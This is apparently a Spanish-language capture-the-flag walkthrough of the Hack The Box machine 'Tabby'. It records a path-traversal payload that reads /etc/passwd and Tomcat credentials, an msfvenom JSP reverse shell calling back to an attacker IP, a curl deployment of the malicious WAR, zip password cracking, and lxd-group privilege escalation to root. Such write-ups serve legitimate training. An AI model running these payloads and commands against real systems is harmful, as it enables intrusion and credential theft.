PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy

-Entramos al puerto 8080 y descubrimos un servidor Default de **Apache Tomcat**

-Probamos a hacer fuerza bruta al /manager , SIN EXITO

-Visitamos la web en el puerto 80 , añadimos el dominio 'megahosting.htb' al /etc/hosts 

-Descubrimos un LFI en el apartado 'news', con la siguiente estructura:
	-http://megahosting.htb/news.php?file=../../../../../../../../../../etc/passwd

-He intentado aplicar Log Poisoning y abusar de /proc , SIN EXITO.

-Visitamos la siguiente web con rutas importantes del servidor Tomcat:
	https://ubuntu.pkgs.org/20.04/ubuntu-universe-amd64/tomcat9_9.0.31-1_all.deb.html

-Probamos a enumerar la siguiente , mediante el 'Path Traversal':
	-http://megahosting.htb/news.php?file=../../../../../../../../../../usr/share/tomcat9/etc/tomcat-users.xml 
	(Hacemos CONTROL + u y vemos el contenido en el código fuente)
		username="tomcat" **password="$3cureP4s5w0rd123!"** **roles="admin-gui,manager-script"**

-Si nos fijamos , nuestro usuario solo tiene los siguientes roles:
	-admin-gui
	-manager-script

-Estos roles nos proporcionan los siguientes permisos:
	-El role **'manager-script'** nos permite acceso a la interfaz de texto **'/manager/text'**, no podemos acceder a la interfaz de **'/manager'** desde la URL (Para eso necesitamos el role **'manager-gui role'**)
	-El role **'admin-gui'** nos permite accede a la interfaz **'/host-manager'** desde la URL (Aunque no nos sirve para nada)

-Como tenemos el **'manager-script'**, y no el **'manager-gui role'**, la **intrusión** (subida del archivo .war malicioso), se hace **a través de consola**, haciendo peticiones con **Curl**:
	1-Generamos archivo .war malicioso con msfvenom:
		-msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.31 LPORT=1234 -f war -o shell.war
	2-Subimos el archivo .war como una aplicación:
		-curl -u 'tomcat:$3cureP4s5w0rd123!' "http://10.10.10.194:8080/manager/text/deploy?path=/shell" --upload-file shell.war
			OK - Deployed application at context path [/shell]
	3-Ejecutamos la RS:
		1-Desde la URL:
			-http://megahosting.htb:8080/shell/
		2-Con Curl:
			-curl -s -X GET 'http://10.10.10.194:8080/shell/'

tomcat@tabby:/$ whoami
	tomcat

## Escalada de Privilegios

-Nos vamos a /var/www/html/files y encontramos el archivo:
	-16162020_backup.zip

-Lo compartimos con nuestra máquina local, nos pide contraseña asi que:
	-zip2john + john:
		admin@it         (16162020_backup.zip)  

-Probamos la contraseña en el usuario ash:
	-su ash
	-Password: admin@it
		ash@tabby:~$ whoami
			ash

-Comprobamos los grupos de ash:
	-id:
		Encontramos --> 116(lxd)

-Escalamos privilegios abusando del grupo 'lxd' de la siguiente forma:
	https://hacktricks.boitatech.com.br/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation
-Usamos --> Method 2 + ayuda de chatgpt

-Al principio tenemos root desde un contenedor que no es la máquina, los archivos de la máquina se encuentra en /mnt/root #

/mnt/root/ # whoami
	root

